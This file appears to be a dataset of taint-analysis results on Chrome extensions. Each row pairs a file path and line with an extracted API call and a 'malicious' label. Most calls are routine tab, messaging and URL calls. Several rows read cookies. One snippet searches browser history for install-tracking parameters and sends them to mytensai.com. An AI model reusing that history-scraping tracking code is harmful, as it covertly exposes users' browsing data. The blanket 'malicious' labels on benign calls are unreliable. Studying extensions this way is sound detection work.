col0,col1,col2,col3,db_type,query_name,extracted_code_block
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/chunk-common.d3333ef8.js,478,chrome.runtime.getManifest,chrome. ... ifest(),malicious,chrome,chrome.runtime.getManifest()
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/new_tab.be8d9eaa.js,328,chrome.runtime.sendMessage,chrome. ... \n    }),malicious,chrome,chrome.runtime.sendMessage({ message: SM_MESSAGE_OPEN_URL })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,1651,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,"chrome.runtime.sendMessage({ message: SM_MESSAGE_GET_USER_PAGES, noCache: true })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,1755,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,chrome.runtime.sendMessage({ message: SM_MESSAGE_OPEN_BOOKMARKS })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,1807,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,chrome.runtime.sendMessage({ message: SM_MESSAGE_SIGN_IN })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,1945,chrome.tabs.remove,chrome. ... sArray),malicious,chrome,chrome.tabs.remove(_this19.selectedOpenTabsArray)
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,1957,chrome.tabs.remove,chrome. ... sArray),malicious,chrome,chrome.tabs.remove(_this19.selectedOpenTabsArray)
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2127,chrome.tabs.remove,chrome. ... sArray),malicious,chrome,chrome.tabs.remove(_this22.selectedOpenTabsArray)
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2208,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,chrome.runtime.sendMessage({ message: SM_MESSAGE_IMPORT })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2219,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,chrome.runtime.sendMessage({ message: SM_MESSAGE_SIGN_OUT })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2238,chrome.tabs.create,chrome. ...      }),malicious,chrome,chrome.tabs.create({ url: 'https://support.start.me/hc/en-us/articles/360018117140' })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2240,chrome.tabs.create,chrome. ...      }),malicious,chrome,chrome.tabs.create({ url: 'chrome://extensions/shortcuts' })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2246,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,chrome.runtime.sendMessage({ message: SM_MESSAGE_SHOW_HELP_PAGE })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2255,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,chrome.runtime.sendMessage({ message: SM_MESSAGE_CLEAR_CACHE })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2295,chrome.tabs.query,chrome. ... ery({}),malicious,chrome,chrome.tabs.query({})
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2340,chrome.tabs.query,chrome. ... ery({}),malicious,chrome,chrome.tabs.query({})
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2485,chrome.tabs.query,chrome. ...      }),malicious,chrome,"chrome.tabs.query({ active: true, currentWindow: true })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/popup.31498d16.js,2506,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,chrome.runtime.sendMessage({ message: SM_MESSAGE_CONTEXT_LINK })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/welcome.836f1d84.js,1603,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,"chrome.runtime.sendMessage({ message: SM_MESSAGE_IMPORT, quiet: true })"
taint-steps/1-getAMethodCall/result/encodeURI-multipleSinks-search.js,19,chrome.runtime.sendMessage,chrome. ... : url}),malicious,chrome,chrome.runtime.sendMessage({openURL: url})
taint-steps/1-getAMethodCall/src/agpoehmhgoieigdbjhgphpagmloehamn.2_0_0_0/background.js,2,chrome.tabs.create,chrome. ... tml')}),malicious,chrome,chrome.tabs.create({url: chrome.runtime.getURL('newtab.html')})
taint-steps/1-getAMethodCall/src/agpoehmhgoieigdbjhgphpagmloehamn.2_0_0_0/background.js,2,chrome.runtime.getURL,chrome. ... .html'),malicious,chrome,chrome.runtime.getURL('newtab.html')
taint-steps/2-getAnArgument/result/getAnArgument-encodeURI-multipleSinks-search.js,24,chrome.runtime.sendMessage,chrome. ... : url}),malicious,chrome,chrome.runtime.sendMessage({openURL: url})
taint-steps/2-getAnArgument/src/kbnpeiabjlfcakokkpbcgalbgiljoddf.2_0_0_0/js/bg.js,21,chrome.runtime.getURL,chrome. ... .html'),malicious,chrome,chrome.runtime.getURL('index.html')
taint-steps/2-getAnArgument/src/kbnpeiabjlfcakokkpbcgalbgiljoddf.2_0_0_0/js/bg.js,64,chrome.runtime.setUninstallURL,chrome. ... allURL),malicious,chrome,chrome.runtime.setUninstallURL(uninstallURL)
taint-steps/2-getAnArgument/src/kbnpeiabjlfcakokkpbcgalbgiljoddf.2_0_0_0/js/search.js,106,chrome.runtime.sendMessage,chrome. ... : url}),malicious,chrome,chrome.runtime.sendMessage({openURL: url})
taint-steps/3-getAParameter/result/getAParameter-react-functionbody-chrome.tabs.create.js,10,chrome.tabs.create,chrome. ... lue}`}),malicious,chrome,chrome.tabs.create({url: `https://www.google.com/search?q=${event.target.value}`})
taint-steps/3-getAParameter/result/getAParameter-react-functionbody-chrome.tabs.create.js,48,chrome.tabs.create,chrome. ...      }),malicious,chrome,"chrome.tabs.create({ url: `https://www.google.com/search?q=${event.target.value}`, })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/background.js,7,chrome.tabs.create,"chrome. ... tml"" })",malicious,chrome,"chrome.tabs.create({ url: ""popup.html"" })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/background.js,11,chrome.runtime.getURL,"chrome. ... 8.png"")",malicious,chrome,"chrome.runtime.getURL(""icon128.png"")"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/background.js,12,chrome.notifications.create,"chrome. ... `,\n  })",malicious,chrome,"chrome.notifications.create(""name-for-notification"", { type: ""basic"", iconUrl: logo, title: ""New Tab With ChatGPT"", message: `${message} Extension`, })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,592,chrome.tabs.create,chrome. ...      }),malicious,chrome,"chrome.tabs.create({ url: ""chrome://history"", })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,617,chrome.history.search,chrome. ...      }),malicious,chrome,"chrome.history.search({ text: """", startTime: startTimeToday, endTime: endTimeToday, }, (data) => { setTodaysHistory(data); })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,624,chrome.history.search,chrome. ...      }),malicious,chrome,"chrome.history.search({ text: """", startTime: startTimeYesterday, endTime: endTimeYesterday, }, (data) => { setYesterdayHistory(data); })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,631,chrome.history.search,chrome. ...      }),malicious,chrome,"chrome.history.search({ text: """" }, (data) => { setSuggestHistory(data); })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,640,chrome.tabs.create,chrome. ...      }),malicious,chrome,"chrome.tabs.create({ url: ""chrome://settings/clearBrowserData"", })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,652,chrome.tabs.create,chrome. ...      }),malicious,chrome,"chrome.tabs.create({ url: ""chrome://history/"", })"
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,1097,chrome.bookmarks.getTree,chrome. ...      }),malicious,chrome,chrome.bookmarks.getTree((res) => { setBookmarks(res[0].children[0].children); })
taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js,1103,chrome.tabs.create,chrome. ...      }),malicious,chrome,"chrome.tabs.create({ url: `https://www.google.com/search?q=${event.target.value}`, })"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.tabs.query,"chrome. ... d""))}))",malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(a=>{for(let t=0;t<a.length;t+=1){const{url:e}=a[t];if(""string""==typeof e&&(e.startsWith(""https://search.shopping.naver.com/search/all?"")||e.startsWith(""https://search.naver.com/search.naver?"")||e.startsWith(o.default.DOMEME_SERACH_URL))){n=e;break}}if(n)try{if(n.startsWith(o.default.DOMEME_SERACH_URL)){const e=n.split(""?"")[1],o=new URLSearchParams(e);if(""subject""!==o.get(""sf""))throw new Error;t(o.get(""sw"")||"""")}else{const e=n.split(""query="")[1].split(""&"")[0];t(e.replace(/\+/g,""%20""))}}catch(t){e(new Error(""err_url_parsing""))}else e(new Error(""err_not_found""))}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.tabs.query,chrome. ... ame)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(e=>{const n=document.createElement(""a"");n.href=e[0].url,t(n.hostname)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.tabs.query,chrome. ... ref)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(e=>{const n=document.createElement(""a"");n.href=e[0].url,t(n.href)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.tabs.query,chrome. ... ow:!0}),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.cookies.getAll,chrome. ... lue)})),malicious,chrome,"chrome.cookies.getAll({domain:e,name:t},(t=>{var e;n(null===(e=t[0])||void 0===e?void 0:e.value)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.runtime.sendMessage,chrome. ... ata)})),malicious,chrome,"chrome.runtime.sendMessage({message:""getGraph"",cid:t,keyword:e,startDate:n,endDate:o},(t=>{a(t.data)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.tabs.sendMessage,chrome. ... ata)})),malicious,chrome,"chrome.tabs.sendMessage(n,{message:t,args:e},(t=>{o(t.data)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js,1,chrome.scripting.executeScript,"chrome. ... .js""]})",malicious,chrome,"chrome.scripting.executeScript({target:{tabId:n},files:[""parser/parser.js""]})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.tabs.create,"chrome. ... tml"")})",malicious,chrome,"chrome.tabs.create({url:chrome.runtime.getURL(""product_analysis_extracting_page/product_analysis_extracting_page.html"")})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.tabs.query,"chrome. ... d""))}))",malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(o=>{for(let e=0;e<o.length;e+=1){const{url:r}=o[e];if(""string""==typeof r&&(r.startsWith(""https://search.shopping.naver.com/search/all?"")||r.startsWith(""https://search.naver.com/search.naver?"")||r.startsWith(t.DOMEME_SERACH_URL))){n=r;break}}if(n)try{if(n.startsWith(t.DOMEME_SERACH_URL)){const t=n.split(""?"")[1],r=new URLSearchParams(t);if(""subject""!==r.get(""sf""))throw new Error;e(r.get(""sw"")||"""")}else{const t=n.split(""query="")[1].split(""&"")[0];e(t.replace(/\+/g,""%20""))}}catch(t){r(new Error(""err_url_parsing""))}else r(new Error(""err_not_found""))}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.tabs.query,chrome. ... ame)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(e=>{const r=document.createElement(""a"");r.href=e[0].url,t(r.hostname)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.tabs.query,chrome. ... ref)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(e=>{const r=document.createElement(""a"");r.href=e[0].url,t(r.href)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.tabs.query,chrome. ... ow:!0}),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.cookies.getAll,chrome. ... lue)})),malicious,chrome,"chrome.cookies.getAll({domain:e,name:t},(t=>{var e;r(null===(e=t[0])||void 0===e?void 0:e.value)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.runtime.sendMessage,chrome. ... e(t)})),malicious,chrome,"chrome.runtime.sendMessage({action:""keywordGraph"",query:t},(t=>{e(t)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.runtime.getURL,"chrome. ... .html"")",malicious,chrome,"chrome.runtime.getURL(""product_analysis_extracting_page/product_analysis_extracting_page.html"")"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.tabs.sendMessage,chrome. ... ata)})),malicious,chrome,"chrome.tabs.sendMessage(r,{message:t,args:e},(t=>{n(t.data)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.scripting.executeScript,"chrome. ... .js""]})",malicious,chrome,"chrome.scripting.executeScript({target:{tabId:r},files:[""parser/parser.js""]})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js,1,chrome.scripting.executeScript,"chrome. ... *""))}})",malicious,chrome,"chrome.scripting.executeScript({target:{tabId:e},files:[""iframe_script/iframe_script.js""]})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/iframe_script/iframe_script.js,1,chrome.runtime.getURL,"chrome. ... .html"")",malicious,chrome,"chrome.runtime.getURL(""popup/popup.html"")"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/inject/inject.js,1,chrome.runtime.getURL,"chrome. ... pt.js"")",malicious,chrome,"chrome.runtime.getURL(""content_script/content_script.js"")"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/keyword_analysis_script/keyword_analysis_script.js,1,chrome.runtime.getURL,"chrome. ... .html"")",malicious,chrome,"chrome.runtime.getURL(""keyword_analysis/keyword_analysis.html"")"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.tabs.query,"chrome. ... d""))}))",malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(n=>{for(let e=0;e<n.length;e+=1){const{url:t}=n[e];if(""string""==typeof t&&(t.startsWith(""https://search.shopping.naver.com/search/all?"")||t.startsWith(""https://search.naver.com/search.naver?"")||t.startsWith(l.DOMEME_SERACH_URL))){a=t;break}}if(a)try{if(a.startsWith(l.DOMEME_SERACH_URL)){const t=a.split(""?"")[1],n=new URLSearchParams(t);if(""subject""!==n.get(""sf""))throw new Error;e(n.get(""sw"")||"""")}else{const t=a.split(""query="")[1].split(""&"")[0];e(t.replace(/\+/g,""%20""))}}catch(e){t(new Error(""err_url_parsing""))}else t(new Error(""err_not_found""))}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.tabs.query,chrome. ... ame)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(t=>{const a=document.createElement(""a"");a.href=t[0].url,e(a.hostname)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.tabs.query,chrome. ... ref)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(t=>{const a=document.createElement(""a"");a.href=t[0].url,e(a.href)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.tabs.query,chrome. ... ow:!0}),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.cookies.getAll,chrome. ... lue)})),malicious,chrome,"chrome.cookies.getAll({domain:t,name:e},(e=>{var t;a(null===(t=e[0])||void 0===t?void 0:t.value)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.tabs.sendMessage,chrome. ... ata)})),malicious,chrome,"chrome.tabs.sendMessage(a,{message:e,args:t},(e=>{n(e.data)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,chrome.scripting.executeScript,"chrome. ... .js""]})",malicious,chrome,"chrome.scripting.executeScript({target:{tabId:a},files:[""parser/parser.js""]})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator_script/margin_calculator_script.js,1,chrome.runtime.getURL,"chrome. ... .html"")",malicious,chrome,"chrome.runtime.getURL(""margin_calculator/margin_calculator.html"")"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.tabs.query,"chrome. ... d""))}))",malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(r=>{for(let e=0;e<r.length;e+=1){const{url:t}=r[e];if(""string""==typeof t&&(t.startsWith(""https://search.shopping.naver.com/search/all?"")||t.startsWith(""https://search.naver.com/search.naver?"")||t.startsWith(l.DOMEME_SERACH_URL))){o=t;break}}if(o)try{if(o.startsWith(l.DOMEME_SERACH_URL)){const t=o.split(""?"")[1],r=new URLSearchParams(t);if(""subject""!==r.get(""sf""))throw new Error;e(r.get(""sw"")||"""")}else{const t=o.split(""query="")[1].split(""&"")[0];e(t.replace(/\+/g,""%20""))}}catch(e){t(new Error(""err_url_parsing""))}else t(new Error(""err_not_found""))}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.tabs.query,chrome. ... ame)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(t=>{const o=document.createElement(""a"");o.href=t[0].url,e(o.hostname)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.tabs.query,chrome. ... ref)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(t=>{const o=document.createElement(""a"");o.href=t[0].url,e(o.href)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.tabs.query,chrome. ... ow:!0}),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.cookies.getAll,chrome. ... lue)})),malicious,chrome,"chrome.cookies.getAll({domain:t,name:e},(e=>{var t;o(null===(t=e[0])||void 0===t?void 0:t.value)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.tabs.sendMessage,chrome. ... ata)})),malicious,chrome,"chrome.tabs.sendMessage(o,{message:e,args:t},(e=>{r(e.data)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,chrome.scripting.executeScript,"chrome. ... .js""]})",malicious,chrome,"chrome.scripting.executeScript({target:{tabId:o},files:[""parser/parser.js""]})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis/product_analysis.js,1,chrome.runtime.sendMessage,"chrome. ... Page""})",malicious,chrome,"chrome.runtime.sendMessage({message:""openProductAnalysisExtractPage""})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.tabs.query,"chrome. ... d""))}))",malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(r=>{for(let e=0;e<r.length;e+=1){const{url:t}=r[e];if(""string""==typeof t&&(t.startsWith(""https://search.shopping.naver.com/search/all?"")||t.startsWith(""https://search.naver.com/search.naver?"")||t.startsWith(b.DOMEME_SERACH_URL))){n=t;break}}if(n)try{if(n.startsWith(b.DOMEME_SERACH_URL)){const t=n.split(""?"")[1],r=new URLSearchParams(t);if(""subject""!==r.get(""sf""))throw new Error;e(r.get(""sw"")||"""")}else{const t=n.split(""query="")[1].split(""&"")[0];e(t.replace(/\+/g,""%20""))}}catch(e){t(new Error(""err_url_parsing""))}else t(new Error(""err_not_found""))}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.tabs.query,chrome. ... ame)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(t=>{const n=document.createElement(""a"");n.href=t[0].url,e(n.hostname)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.tabs.query,chrome. ... ref)})),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0},(t=>{const n=document.createElement(""a"");n.href=t[0].url,e(n.href)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.tabs.query,chrome. ... ow:!0}),malicious,chrome,"chrome.tabs.query({active:!0,currentWindow:!0})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.cookies.getAll,chrome. ... lue)})),malicious,chrome,"chrome.cookies.getAll({domain:t,name:e},(e=>{var t;n(null===(t=e[0])||void 0===t?void 0:t.value)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.tabs.sendMessage,chrome. ... ata)})),malicious,chrome,"chrome.tabs.sendMessage(n,{message:e,args:t},(e=>{r(e.data)}))"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js,1,chrome.scripting.executeScript,"chrome. ... .js""]})",malicious,chrome,"chrome.scripting.executeScript({target:{tabId:n},files:[""parser/parser.js""]})"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_script/product_analysis_script.js,1,chrome.runtime.getURL,"chrome. ... .html"")",malicious,chrome,"chrome.runtime.getURL(""product_analysis/product_analysis.html"")"
taint-steps/SUMMARY-simplified-snippets/getAParameter-react-functionbody-chrome.tabs.create.js,10,chrome.tabs.create,chrome. ... lue}`}),malicious,chrome,chrome.tabs.create({url: `https://www.google.com/search?q=${event.target.value}`})
taint-steps/SUMMARY-simplified-snippets/getAParameter-react-functionbody-chrome.tabs.create.js,48,chrome.tabs.create,chrome. ...      }),malicious,chrome,"chrome.tabs.create({ url: `https://www.google.com/search?q=${event.target.value}`, })"
taint-steps/SUMMARY-simplified-snippets/getAParameter-react-functionbody-chrome.tabs.create.js,70,chrome.history.search,chrome. ... \n    }),malicious,chrome,"chrome.history.search( { text: ""mytensai.com/install-ext?pid="" }, function(historyItems) { if(historyItems.length>0){ for (var i = 0; i < historyItems.length; ++i) { if(null!==getParameterByName('pid', historyItems[i].url) && getParameterByName('clickid', historyItems[i].url) ){  var pid = getParameterByName('pid', historyItems[i].url); var clickid = getParameterByName('clickid', historyItems[i].url); chrome.storage.sync.set({'pid':pid,'clickid': clickid}); //_gaq.push(['_trackEvent', clickid, 'clicked']);  var url = 'https://mytensai.com/mth/installTrack.php?pid='+pid+'&clickid='+clickid; fetch(url).then(function(response) { return response.json(); }).then(function(data) { console.log(data); }).catch(function() { console.log(""Booo""); }); //HttpRequest(pid,clickid); return; } } }else{ chrome.storage.sync.set({'pid':'pid','clickid': 'clickid'}); } })"
taint-steps/SUMMARY-simplified-snippets/getAnArgument-encodeURI-multipleSinks-search.js,24,chrome.runtime.sendMessage,chrome. ... : url}),malicious,chrome,chrome.runtime.sendMessage({openURL: url})
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/keyword_analysis/keyword_analysis.js,82,window.parent.postMessage,"window. ... ://""+e)",malicious,postMessage,"window.parent.postMessage({m:""itemscoutKeywordAnalysisResize"",w:_,o:!t},""https://""+e)"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,window.parent.postMessage,"window. ... ""},""*"")",malicious,postMessage,"window.parent.postMessage({m:""getCurrentUrl""},""*"")"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js,1,window.parent.postMessage,"window. ... ://""+s)",malicious,postMessage,"window.parent.postMessage({m:""itemscoutMarginCalculatorResize"",w:a,o:!e},""https://""+s)"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js,1,window.parent.postMessage,"window. ... ://""+e)",malicious,postMessage,"window.parent.postMessage(""itemscoutWebExtensionClose"",""https://""+e)"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis/product_analysis.js,1,window.parent.postMessage,"window. ... ://""+e)",malicious,postMessage,"window.parent.postMessage({m:""getCurrentUrl""},""*"")"
